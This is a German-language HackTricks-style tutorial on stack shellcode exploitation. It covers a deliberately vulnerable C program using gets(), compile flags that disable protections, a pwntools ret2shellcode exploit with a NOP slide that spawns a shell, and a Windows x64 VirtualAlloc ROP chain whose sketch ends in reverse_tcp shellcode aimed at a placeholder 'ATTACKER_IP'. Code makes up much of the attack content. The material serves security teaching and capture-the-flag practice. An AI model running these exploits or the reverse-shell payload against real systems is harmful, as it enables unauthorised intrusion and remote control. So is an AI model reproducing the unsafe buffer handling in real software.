# Stack Shellcode

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen

**Stack shellcode** ist eine Technik, die in der **binary exploitation** verwendet wird, bei der ein Angreifer Shellcode auf den Stack eines verwundbaren Programms schreibt und dann den **Instruction Pointer (IP)** oder **Extended Instruction Pointer (EIP)** so ändert, dass er auf die Position dieses Shellcodes zeigt und dessen Ausführung bewirkt. Dies ist eine klassische Methode, um unbefugten Zugriff zu erlangen oder beliebige Befehle auf einem Zielsystem auszuführen. Hier ist eine Aufschlüsselung des Prozesses, einschließlich eines einfachen C-Beispiels und wie man einen entsprechenden Exploit mit Python und **pwntools** schreiben könnte.

### C-Beispiel: Ein verwundbares Programm

Beginnen wir mit einem einfachen Beispiel für ein verwundbares C-Programm:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
Dieses Programm ist aufgrund der Verwendung der Funktion `gets()` anfällig für einen buffer overflow.

### Kompilierung

Um dieses Programm zu kompilieren und verschiedene Schutzmechanismen zu deaktivieren (um eine verwundbare Umgebung zu simulieren), können Sie den folgenden Befehl verwenden:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
- `-fno-stack-protector`: Deaktiviert den Stack-Schutz.
- `-z execstack`: Macht den Stack ausführbar, was notwendig ist, um shellcode auszuführen, der auf dem Stack gespeichert ist.
- `-no-pie`: Deaktiviert Position Independent Executable (PIE), wodurch es einfacher wird, die Speicheradresse vorherzusagen, an der unser shellcode liegen wird.
- `-m32`: Kompiliert das Programm als 32-Bit ausführbare Datei; wird oft zur Vereinfachung bei der Exploit-Entwicklung verwendet.

### Python Exploit mit Pwntools

So könnten Sie einen Exploit in Python mit **pwntools** schreiben, um einen **ret2shellcode** attack durchzuführen:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
Dieses Skript konstruiert eine Payload, die aus einer **NOP slide**, dem **shellcode**, besteht und überschreibt dann die **EIP** mit der Adresse, die auf die NOP slide zeigt, wodurch sichergestellt wird, dass der shellcode ausgeführt wird.

Die **NOP slide** (`asm('nop')`) wird verwendet, um die Wahrscheinlichkeit zu erhöhen, dass die Ausführung in unseren shellcode "einschlägt", unabhängig von der genauen Adresse. Passe das `p32()`-Argument an die Startadresse deines Buffers plus einen Offset an, um in die NOP slide zu landen.

## Windows x64: NX umgehen mit VirtualAlloc ROP (ret2stack shellcode)

Auf modernen Windows-Systemen ist der Stack nicht ausführbar (DEP/NX). Eine gängige Methode, um dennoch stack-residenten shellcode nach einem stack BOF auszuführen, besteht darin, eine 64-Bit ROP chain zu bauen, die VirtualAlloc (oder VirtualProtect) aus der module Import Address Table (IAT) aufruft, um einen Bereich des Stacks ausführbar zu machen, und dann in den unmittelbar nach der chain angehängten shellcode zurückzuspringen.

Wichtige Punkte (Win64 calling convention):
- VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
- RCX = lpAddress → wähle eine Adresse im aktuellen Stack (z. B. RSP), sodass der neu allocierte RWX-Bereich mit deinem Payload überlappt
- RDX = dwSize → groß genug für deine chain + shellcode (z. B. 0x1000)
- R8  = flAllocationType = MEM_COMMIT (0x1000)
- R9  = flProtect = PAGE_EXECUTE_READWRITE (0x40)
- Direkt in den unmittelbar nach der chain platzierten shellcode zurückkehren.

Minimale Strategie:
1) Leak a module base (z. B. via format-string, object pointer, etc.), um unter ASLR absolute Gadget- und IAT-Adressen zu berechnen.
2) Finde Gadgets, um RCX/RDX/R8/R9 zu laden (pop- oder mov/xor-basierte Sequenzen) und einen call/jmp [VirtualAlloc@IAT]. Falls du keine direkten pop r8/r9 hast, nutze arithmetische Gadgets, um Konstanten zu synthetisieren (z. B. r8=0 setzen und r9 wiederholt um 0x40 addieren, vierzig Mal, um 0x1000 zu erreichen).
3) Platziere Stage-2 shellcode unmittelbar nach der chain.

Beispiel-Layout (konzeptionell):
```
# ... padding up to saved RIP ...
# R9 = 0x40 (PAGE_EXECUTE_READWRITE)
POP_R9_RET; 0x40
# R8 = 0x1000 (MEM_COMMIT) — if no POP R8, derive via arithmetic
POP_R8_RET; 0x1000
# RCX = &stack (lpAddress)
LEA_RCX_RSP_RET    # or sequence: load RSP into a GPR then mov rcx, reg
# RDX = size (dwSize)
POP_RDX_RET; 0x1000
# Call VirtualAlloc via the IAT
[IAT_VirtualAlloc]
# New RWX memory at RCX — execution continues at the next stack qword
JMP_SHELLCODE_OR_RET
# ---- stage-2 shellcode (x64) ----
```
Mit einem eingeschränkten gadget set kannst du Registerwerte indirekt konstruieren, zum Beispiel:
- mov r9, rbx; mov r8, 0; add rsp, 8; ret → setzt r9 aus rbx, nullt r8 und kompensiert den Stack mit einem Junk-qword.
- xor rbx, rsp; ret → initialisiert rbx mit dem aktuellen stack pointer.
- push rbx; pop rax; mov rcx, rax; ret → verschiebt den von RSP abgeleiteten Wert in RCX.

Pwntools-Skizze (bei bekannter base und gadgets):
```python
from pwn import *
base = 0x7ff6693b0000
IAT_VirtualAlloc = base + 0x400000  # example: resolve via reversing
rop  = b''
# r9 = 0x40
rop += p64(base+POP_RBX_RET) + p64(0x40)
rop += p64(base+MOV_R9_RBX_ZERO_R8_ADD_RSP_8_RET) + b'JUNKJUNK'
# rcx = rsp
rop += p64(base+POP_RBX_RET) + p64(0)
rop += p64(base+XOR_RBX_RSP_RET)
rop += p64(base+PUSH_RBX_POP_RAX_RET)
rop += p64(base+MOV_RCX_RAX_RET)
# r8 = 0x1000 via arithmetic if no pop r8
for _ in range(0x1000//0x40):
rop += p64(base+ADD_R8_R9_ADD_RAX_R8_RET)
# rdx = 0x1000 (use any available gadget)
rop += p64(base+POP_RDX_RET) + p64(0x1000)
# call VirtualAlloc and land in shellcode
rop += p64(IAT_VirtualAlloc)
rop += asm(shellcraft.amd64.windows.reverse_tcp("ATTACKER_IP", ATTACKER_PORT))
```
Tipps:
- VirtualProtect funktioniert ähnlich, falls es vorzuziehen ist, einen bestehenden Buffer als RX zu markieren; die Parameterreihenfolge ist anders.
- Wenn der Stack-Speicher knapp ist, alloziere RWX an einer anderen Stelle (RCX=NULL) und jmp zu diesem neuen Bereich, anstatt den Stack wiederzuverwenden.
- Berücksichtige immer gadgets, die RSP anpassen (z. B. add rsp, 8; ret), indem du Junk qwords einfügst.


- [**ASLR**](../../common-binary-protections-and-bypasses/aslr/index.html) **sollte deaktiviert sein**, damit die Adresse über mehrere Ausführungen hinweg zuverlässig ist; andernfalls wird die Adresse, an der die Funktion gespeichert wird, nicht immer dieselbe sein und du würdest irgendeinen leak benötigen, um herauszufinden, wo die win function geladen ist.
- [**Stack Canaries**](../../common-binary-protections-and-bypasses/stack-canaries/index.html) sollten ebenfalls deaktiviert sein, sonst wird die kompromittierte EIP-Rücksprungadresse niemals ausgeführt.
- [**NX**](../../common-binary-protections-and-bypasses/no-exec-nx.md) **stack**-Schutz würde die Ausführung des Shellcodes im Stack verhindern, da dieser Bereich nicht ausführbar wäre.

## Weitere Beispiele & Referenzen

- [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
- [https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html)
- 64bit, ASLR mit stack address leak, Shellcode schreiben und zu diesem springen
- [https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html)
- 32 bit, ASLR mit stack leak, Shellcode schreiben und zu diesem springen
- [https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html)
- 32 bit, ASLR mit stack leak, Vergleich, um einen Aufruf von exit() zu verhindern, Variable mit einem Wert überschreiben, Shellcode schreiben und zu diesem springen
- [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
- arm64, kein ASLR, ROP-gadget, um den Stack ausführbar zu machen und zum Shellcode im Stack zu springen


## Referenzen

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE)](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [VirtualAlloc documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

{{#include ../../../banners/hacktricks-training.md}}
